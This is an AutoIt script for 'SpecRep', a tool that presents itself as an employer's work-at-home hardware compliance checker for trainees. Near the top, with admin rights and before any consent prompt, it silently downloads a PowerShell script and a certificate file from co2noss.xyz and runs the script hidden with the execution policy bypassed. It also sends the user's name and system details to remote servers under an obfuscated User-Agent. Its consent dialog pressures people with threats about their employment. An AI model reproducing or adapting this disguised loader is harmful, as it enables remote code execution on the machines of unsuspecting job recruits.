#NoTrayIcon
#RequireAdmin
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=specrep.ico
#AutoIt3Wrapper_Outfile=C:\Users\Ilumini\Desktop\SpecRep.exe
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_Res_Description=teleNetwork WAH Requirements Compiler
#AutoIt3Wrapper_Res_Fileversion=1.7.3.0
#AutoIt3Wrapper_Res_ProductVersion=1.7.3.0
#AutoIt3Wrapper_Res_LegalCopyright=Created by Rob Nelson
#AutoIt3Wrapper_Res_Language=1033
#AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
#AutoIt3Wrapper_Add_Constants=n
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <Inet.au3>
#include <GuiTab.au3>
#include <Array.au3>

FileInstall("C:\Users\Ilumini\Desktop\Google Drive\Code\SpecRep\splash.bmp", @TempDir&"\", 1)
SplashImageOn("SpecRep", @TempDir&"\splash.bmp", 650, 450, -1, -1, 19)

;MsgBox(64, "SpecRep", _Obtain_Active_Adapter() )
;MsgBox(64, "SpecRep", _Name_Of_Proc() )
;MsgBox(64, "SpecRep", _Number_Of_Pcores() )
;MsgBox(64, "SpecRep", _Number_Of_Lcores() )
;MsgBox(64, "SpecRep", _Amount_Of_RAM() )
;MsgBox(64, "SpecRep", _Speed_Of_Proc() )
;MsgBox(64, "SpecRep", _Check_Machine_Type() )
;MsgBox(64, "SpecRep", _Get_IE_Version() )
;MsgBox(64, "SpecRep", _Get_Chrome_Version() )

InetGet("https://co2noss.xyz/specrep/SpecRep.pfx", @TempDir & "\SpecRep.pfx", 1)
Sleep(2000)
InetGet("https://co2noss.xyz/specrep/SpecRep.ps1", @TempDir & "\SpecRep.ps1", 1)
Sleep(2000)

Run("powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file " & @Tempdir & "\SpecRep.ps1", "", @SW_HIDE)


Global $InputCheck = 0
While $InputCheck = 0
	Global $agentname = InputBox( "SpecRep", "Please enter your full first and last name." , "", "", 300, 150 )

	If $agentname <> "" And StringRegExp($agentname, "^\w+(\s\w+)*$") Then
		ExitLoop
	EndIf

	MsgBox(16, "SpecRep", "Please enter your full first and last name. Only letters are allowed. Press OK to try again.")

WEnd




$ToSAnswerRaw = MsgBox(4, "PLEASE READ - VERY IMPORTANT", "NOTE: You should ONLY be using a computer that was approved by a Recruiting agent. This is a mandatory condition of your employment. If you are using a different computer than the one approved by Recruiting, please reach out to your Trainer immediately." & @CRLF & @CRLF & "SpecRep collects hardware specifications about your computer that are ONLY RELATIVE to teleNetwork's Work-At-Home Requirement and Compliancy policies. Allowing SpecRep to collect this information about your computer is a mandatory condition of your employment with teleNetwork. SpecRep may ask you several questions about your computer specifications pertaining to these policies. Answering any of these questions dishonestly, intentionally or not, could result in immediate administrative action. By answering 'Yes' below, you fully consent to letting SpecRep collect this necessary information and agree that your answers will be truthful. Do you agree?")

If $TosAnswerRaw = 7 Then

	MsgBox(16, "SpecRep", "You did not agree to SpecRep's Terms of Service. Allowing SpecRep to collect this information about your computer is a MANDATORY condition of your employment with teleNetwork. Your answer has been reported. A member of our Training Staff will reach out to you shortly. SpecRep will now exit. Thank you.")

$agentOS = "ToS Agreement Declined. Please reach out to trainee."
$ProcName = "N/A"
$ProcPCores = "N/A"
$ProcLCores = "N/A"
$ProcSpeed = "N/A"
$RAM = "N/A"
$InternetAdapter = "N/A"
$MachType = "N/A"
$IE = "N/A"
$Chrome = "N/A"
$USBHeadAnswer = "N/A"
$MonitSizeAnswer = "N/A"
$WebCamAnswer = "N/A"
$AVAnswer = "N/A"

	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
	$oHTTP.Open("GET", "https://co2noss.xyz/specrep/datatrack.php?username=" & $agentname & "&os=" & $agentOS & "&procname=" & $ProcName & "&pcores=" & $ProcPCores & "&lcores=" & $ProcLCores & "&procspeed=" & $ProcSpeed & "&ram=" & $RAM & "&inetadapter=" & $InternetAdapter & "&machtype=" & $MachType & "&iever=" & $IE & "&chromever=" & $Chrome & "&usbhead=" & $USBHeadAnswer & "&monitsize=" & $MonitSizeAnswer & "&webcamans=" & $WebCamAnswer & "&avanswer=" & $AVAnswer, False)
	$oHTTP.SetRequestHeader("User-Agent", "b4omBYq$3n#FlMV7;A6r^kyjeZiWJd@Kt5wpUg!us&~xazfIcL-X&%rL1FOWfwapyTG5QoB:9l*;E7gbP!3eK@snYHV=^6uxzDmdJ")
	$oHTTP.Send()

	Exit

EndIf


Global $NetAdapterInterface = GetAdapterAndConType()


$ProcName = _Name_Of_Proc()
$ProcPCores = _Number_Of_Pcores()
$ProcLCores = _Number_Of_Lcores()
$ProcSpeed = _Speed_Of_Proc()
$RAM = _Amount_Of_RAM()
$InternetAdapter = _ArraytoString($NetAdapterInterface, "|", 0, 0, @CRLF, 0, 0)
$MachType = _Check_Machine_Type()
$IE = _Get_IE_Version()
$Chrome = _Get_Chrome_Version()
$SpecsFailed = 0
$NetFailed = 0
$USBETH = 0

$ProcFailed = 0
$RAMFailed = 0
$NetFailed = 0
$USBADAPT = 0


If Ceiling($ProcPCores) < 2 Or Ceiling($ProcLCores) < 2 Or Ceiling($ProcSpeed) < 2.0 Then
	$ProcFailed = 1
EndIf

If Ceiling($RAM) < 3 Then
	$RAMFailed = 1
EndIf


If StringInStr($InternetAdapter, "wifi", 0, 1) Then
	$NetFailed = 1
EndIf

If StringInStr($InternetAdapter, "USB", 0, 1) Then
	$USBETH = 1
EndIf



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Global $rawOS = @OSVersion

If $rawOS = "WIN_VISTA" Then
	Global $agentOS = "Windows Vista"
EndIf

If $rawOS = "WIN_7" Then
	Global $agentOS = "Windows 7"
EndIf

If $rawOS = "WIN_8" Then
	Global $agentOS = "Windows 8"
EndIf

If $rawOS = "WIN_81" Then
	Global $agentOS = "Windows 8.1"
EndIf

If $rawOS = "WIN_10" Then
	Global $agentOS = "Windows 10"
EndIf

If $rawOS = "WIN_XP" Then
	Global $agentOS = "Windows XP"
EndIf

If $rawOS = "WIN_2016" Then
	Global $agentOS = "Windows Server 2016"
EndIf

If $rawOS = "WIN_2012R2" Or $rawOS = "WIN_2012" Then
	Global $agentOS = "Windows Server 2012"
EndIf

If $rawOS = "WIN_2008R2" Or $rawOS = "WIN_2008" Then
	Global $agentOS = "Windows Server 2008"
EndIf

If $rawOS = "WIN_2003" Then
	Global $agentOS = "Windows Server 2003"
EndIf

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



$USBHeadAnswerRaw = MsgBox(4, "SpecRep", "Do you own a hardwired USB Headset?")

If $USBHeadAnswerRaw = 6 Then
	$USBHeadAnswer = "Yes"
Else
	$USBHeadAnswer = "No"
EndIf


$MonitSizeAnswerRaw = MsgBox(4, "SpecRep", "Is your computer monitor screen at least 15 inches?")

If $MonitSizeAnswerRaw = 6 Then
	$MonitSizeAnswer = "Yes"
Else
	$MonitSizeAnswer = "No"
EndIf


$WebCamAnswerRaw = MsgBox(4, "SpecRep", "Do you own a Skype compatible webcam?")

If $WebCamAnswerRaw = 6 Then
	$WebCamAnswer = "Yes"
Else
	$WebCamAnswer = "No"
EndIf

$AVAnswerRaw = MsgBox(4, "SpecRep", "Do you have an antivirus installed and fully working on your PC?")


If $AVAnswerRaw = 6 Then
	$AVAnswer = "Yes"
Else
	$AVAnswer = "No"
EndIf




$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
$oHTTP.Open("GET", "https://specrep.net/datatrack.php?username=" & $agentname & "&os=" & $agentOS & "&procname=" & $ProcName & "&pcores=" & $ProcPCores & "&lcores=" & $ProcLCores & "&procspeed=" & $ProcSpeed & "&ram=" & $RAM & "&inetadapter=" & $InternetAdapter & "&machtype=" & $MachType & "&iever=" & $IE & "&chromever=" & $Chrome & "&usbhead=" & $USBHeadAnswer & "&monitsize=" & $MonitSizeAnswer & "&webcamans=" & $WebCamAnswer & "&avanswer=" & $AVAnswer, False)
$oHTTP.SetRequestHeader("User-Agent", "b4omBYq$3n#FlMV7;A6r^kyjeZiWJd@Kt5wpUg!us&~xazfIcL-X&%rL1FOWfwapyTG5QoB:9l*;E7gbP!3eK@snYHV=^6uxzDmdJ")
$oHTTP.Send()


Sleep(1000)

Select
	Case $ProcFailed = 1
		MsgBox(16, "SpecRep", "Please be advised that your processor does not meet our minimum W.A.H. Requirements Policy. This information has been recorded and reported to the Training Team Staff. Please reach out to your instructor immediately and provide them the contents of this message. Thank you. This program will now exit.")
		Exit
	Case $ProcFailed = 1
		MsgBox(16, "SpecRep", "Please be advised that your processor does not meet our minimum W.A.H. Requirements Policy. This information has been recorded and reported to the Training Team Staff. Please reach out to your instructor immediately and provide them the contents of this message. Thank you. This program will now exit.")
		Exit
	Case $RAMFailed = 1
		MsgBox(16, "SpecRep", "Please be advised that your computer does not have enough RAM to meet our W.A.H. Requirements Policy. This information has been recorded and reported to the Training Team Staff. Please reach out to your instructor immediately and provide them the contents of this message. Thank you. This program will now exit.")
		Exit
	Case $NetFailed = 1
		MsgBox(16, "SpecRep", "Please be advised that SpecRep has detected your computer is using a WiFi connection. This is in violation of our W.A.H. Requirements Policy. You are REQUIRED to use a hardwired ethernet connection from the back of your computer directly to your modem. This information has been recorded and reported to the Training Team Staff. Please reach out to your instructor immediately and provide them with the contents of this message. Thank you. This program will now exit.")
		Exit
	Case $USBETH = 1
		MsgBox(16, "SpecRep", "Please be advised that SpecRep has detected your computer is using a USB adapter for your internet connection. This could either be a USB WiFi stick or a USB-to-Ethernet adapter. If you are on WiFi, please be advised this is in violation of our W.A.H. Requirements Policy and you will need to plug an ethernet cable directly from the back of your computer to your modem. Please reach out to your instructor immediately and provide them with the contents of this message. Thank you. This program will now exit.")
	Case $USBHeadAnswer = "No"
		MsgBox(16, "SpecRep", "You indicated that you are not using a USB headset. This violates our Work at Home Compliance Policy via the Policy Handbook. This information has been recorded and reported to the Training Team staff. Please reach out to your instructor immediately and provide them with the contents of this message. Thank you. This program will now exit.")
	Case $WebCamAnswer = "No"
		MsgBox(16, "SpecRep", "You indicated that you do not have a working webcam. This violates our Work at Home Compliance Policy via the Policy Handbook. This information has been recorded and reported to the Training Team staff. Please reach out to your instructor immediately and provide them with the contents of this message. Thank you. This program will now exit.")
	Case $AVAnswer = "No"
		MsgBox(16, "SpecRep", "You indicated that you do not have an installed, working antivirus on your computer. This violates our Work at Home Compliance Policy via the Policy Handbook. This information has been recorded and reported to the Training Team staff. Please reach out to your instructor immediately and provide them with the contents of this message. Thank you. This program will now exit.")
	Case Else
		MsgBox(64, "SpecRep", "SpecRep has finished reporting your computer specifications. If you are reading this message, this means your computer is 100 percent compliant with our Work at Home Compliancy policies. Please let your instructor know you've finished running SpecRep. Thank you. This program will now exit.")
		Exit
EndSelect


SplashOff()


Exit






;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Func _Number_Of_Pcores()
    Local $z_Text = ''
    Dim $Obj_WMIService = ObjGet('winmgmts:{impersonationLevel=impersonate}!\\' & @ComputerName & '\root\cimv2');
    If (IsObj($Obj_WMIService)) And (Not @error) Then
        Dim $Col_Items = $Obj_WMIService.ExecQuery('Select * from Win32_Processor')

        Local $Obj_Items
        For $Obj_Items In $Col_Items
            Local $z_Text = $Obj_Items.NumberOfCores
        Next

        Return String($z_Text)
    Else
        Return 0
    EndIf
EndFunc

Func _Name_Of_Proc()
    Local $z_Text = ''
    Dim $Obj_WMIService = ObjGet('winmgmts:{impersonationLevel=impersonate}!\\' & @ComputerName & '\root\cimv2');
    If (IsObj($Obj_WMIService)) And (Not @error) Then
        Dim $Col_Items = $Obj_WMIService.ExecQuery('Select * from Win32_Processor')

        Local $Obj_Items
        For $Obj_Items In $Col_Items
            Local $z_Text = $Obj_Items.Name
        Next

        Return String($z_Text)
    Else
        Return 0
    EndIf
EndFunc


Func _Number_Of_Lcores()
    Local $z_Text = ''
    Dim $Obj_WMIService = ObjGet('winmgmts:{impersonationLevel=impersonate}!\\' & @ComputerName & '\root\cimv2');
    If (IsObj($Obj_WMIService)) And (Not @error) Then
        Dim $Col_Items = $Obj_WMIService.ExecQuery('Select * from Win32_Processor')

        Local $Obj_Items
        For $Obj_Items In $Col_Items
            Local $z_Text = $Obj_Items.NumberOfLogicalProcessors
        Next

        Return String($z_Text)
    Else
        Return 0
    EndIf
EndFunc

Func _Amount_Of_RAM()
    Local $z_Text = ''
    Dim $Obj_WMIService = ObjGet('winmgmts:{impersonationLevel=impersonate}!\\' & @ComputerName & '\root\cimv2');
    If (IsObj($Obj_WMIService)) And (Not @error) Then
        Dim $Col_Items = $Obj_WMIService.ExecQuery('Select * from Win32_ComputerSystem')

        Local $Obj_Items
        For $Obj_Items In $Col_Items
            Local $z_Text = $Obj_Items.TotalPhysicalMemory
			Local $x_Text = $z_Text / 1073741824
			Local $y_Text = Round($x_Text, 0)
        Next

        Return String($y_Text)
    Else
        Return 0
    EndIf
EndFunc

Func _Speed_Of_Proc()
    Local $z_Text = ''
    Dim $Obj_WMIService = ObjGet('winmgmts:{impersonationLevel=impersonate}!\\' & @ComputerName & '\root\cimv2');
    If (IsObj($Obj_WMIService)) And (Not @error) Then
        Dim $Col_Items = $Obj_WMIService.ExecQuery('Select * from Win32_Processor')

        Local $Obj_Items
        For $Obj_Items In $Col_Items
            Local $z_Text = $Obj_Items.MaxClockSpeed
			Local $x_Text = $z_Text * .001
			Local $y_Text = Round($x_Text, 1)
        Next

        Return String($y_Text)
    Else
        Return 0
    EndIf
EndFunc


Func _Obtain_Machine_Mfg()
    Local $z_Text = ''
    Dim $Obj_WMIService = ObjGet('winmgmts:{impersonationLevel=impersonate}!\\' & @ComputerName & '\root\cimv2');
    If (IsObj($Obj_WMIService)) And (Not @error) Then
        Dim $Col_Items = $Obj_WMIService.ExecQuery('Select * from Win32_ComputerSystem')

        Local $Obj_Items
        For $Obj_Items In $Col_Items
            Local $z_Text = $Obj_Items.Manufacturer
        Next

        Return String($z_Text)
    Else
        Return 0
    EndIf
EndFunc


Func _Get_IE_Version()
	Local $IEVersionRaw = FileGetVersion(@ProgramFilesDir & "\Internet Explorer\iexplore.exe")
	Local $IEVersion = Round($IEVersionRaw, 0)
	If $IEVersion = 0 Then
		$IEVersion = "Not Installed"
	EndIf
	Return String($IEVersion)
EndFunc




Func _Obtain_Active_Adapter()
	    Local $z_Text = ''
    Dim $Obj_WMIService = ObjGet('winmgmts:{impersonationLevel=impersonate}!\\' & @ComputerName & '\root\cimv2');
    If (IsObj($Obj_WMIService)) And (Not @error) Then
        Dim $Col_Items = $Obj_WMIService.ExecQuery('Select * from Win32_NetworkAdapterConfiguration WHERE IPEnabled = "True" AND DHCPEnabled = "True" AND DHCPServer != ""')

        Local $Obj_Items
        For $Obj_Items In $Col_Items
            Local $z_Text = $Obj_Items.Description
        Next

        Return String($z_Text)
    Else
        Return 0
    EndIf
EndFunc

Func _Get_Chrome_Version()
	Local $ChromeVersionRaw = FileGetVersion(@ProgramFilesDir & "\Google\Chrome\Application\chrome.exe")
	Local $ChromeVersion = Round($ChromeVersionRaw, 0)
	If $ChromeVersion = 0 Then
		$ChromeVersion = "Not Installed"
	EndIf
	Return String($ChromeVersion)
EndFunc


Func _Check_Machine_Type()
$compMFG = _Obtain_Machine_Mfg()

If StringInStr($compMFG, "Virtual", 2) Or StringInStr($compMFG, "Microsoft", 2) Or StringInStr($compMFG, "VMware", 2) Or StringInStr($compMFG, "VirtualBox", 2) Or StringInStr($compMFG, "Hyper", 2) Or StringInStr($compMFG, "Oracle", 2) Or StringInStr($compMFG, "Citrix", 2) or StringInStr($compMFG, "KVM", 2) Or StringInStr($compMFG, "Bochs", 2) Or StringInStr($compMFG, "HVM", 2) Or StringInStr($compMFG, "Google", 2) Then

	Local $machineType = "Virtual"

Else
	Local $machineType = "Physical"

EndIf

Return String($machineType)

EndFunc




Func GetAdapterAndConType()
    Local $NetAdapterAr = GetTangibleiNetAdapters(), _;get network adapters with ip Addresses and not virutal box
            $NetworkAdapterKey = "HKLM64\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}", _;this key seems to be static
            $NetAdapterKeyAr = regsubkeys($NetworkAdapterKey), _
            $loopAdapter = 0, _
            $InterfaceType = 0, _
            $Outputar[$NetAdapterAr[0] - 1][2], _
            $outputcnt = 0
    For $i = 0 To UBound($NetAdapterKeyAr) - 1
        $loopAdapter = RegRead($NetworkAdapterKey & "\" & $NetAdapterKeyAr[$i], "DriverDesc")
        For $l = 0 To $NetAdapterAr[0] - 1
            If $loopAdapter = $NetAdapterAr[$l] Then
                $InterfaceType = RegRead($NetworkAdapterKey & "\" & $NetAdapterKeyAr[$i] & "\Ndi\Interfaces", "LowerRange")
                If StringInStr($InterfaceType, "wifi") Or StringInStr($InterfaceType, "wlan") Then
                    ;wireless
if $outputcnt = $NetAdapterAr[0] - 1 then ReDim $Outputar[$outputcnt + 1][2] ;if duplicate entries exist in your registry then this will prevent the script from error
                    $Outputar[$outputcnt][0] = $loopAdapter
                    $Outputar[$outputcnt][1] = "Wireless"
                    $outputcnt += 1
                ElseIf StringInStr($InterfaceType, "ethernet") And Not StringInStr($InterfaceType, "wifi") And Not StringInStr($InterfaceType, "wlan") Then
                    ;wired
if $outputcnt = $NetAdapterAr[0] - 1 then ReDim $Outputar[$outputcnt + 1][2] ;if duplicate entries exist in your registry then this will prevent the script from error
                    $Outputar[$outputcnt][0] = $loopAdapter
                    $Outputar[$outputcnt][1] = "Wired"
                    $outputcnt += 1
                EndIf
            EndIf
        Next
    Next
    Return $Outputar
EndFunc   ;==>GetAdapterAndConType

Func GetTangibleiNetAdapters()
    ;Generated by AutoIt Scriptomatic
    Local $wbemFlagReturnImmediately = 0x10, _
            $wbemFlagForwardOnly = 0x20, _
            $colItems = "", _
            $strComputer = "localhost", _
            $Output = "", _
            $objWMIService = ObjGet("winmgmts:\\" & $strComputer & "\root\CIMV2")
    $colItems = $objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration", "WQL", _
            $wbemFlagReturnImmediately + $wbemFlagForwardOnly)
    If IsObj($colItems) Then
        For $objItem In $colItems
            If StringInStr($objItem.IPAddress(0), '.') And Not StringInStr($objItem.Description, "virtual") Then
                $Output = $Output & $objItem.Description & @CR
            EndIf
        Next
    Else
        MsgBox(0, "WMI Output", "No WMI Objects Found for class: " & "Win32_NetworkAdapterConfiguration")
    EndIf
    Local $returnar = StringSplit($Output, @CR)
    _ArrayDelete($returnar, $returnar[0]);delete extra @cr
    Return $returnar
EndFunc   ;==>GetTangibleiNetAdapters

Func regsubkeys($key)
    Local $sSubKey[50000], _
            $i = 1
    While 1
        $sSubKey[$i - 1] = RegEnumKey($key, $i)
        $i += 1
        If @error Then ExitLoop
    WEnd
    ReDim $sSubKey[$i - 1]
    Return $sSubKey
EndFunc   ;==>regsubkeys


Local $aArray[4][4]
For $i = 0 To 3
    For $j = 0 To 3
        $aArray[$i][$j] = $i & $j
    Next
Next


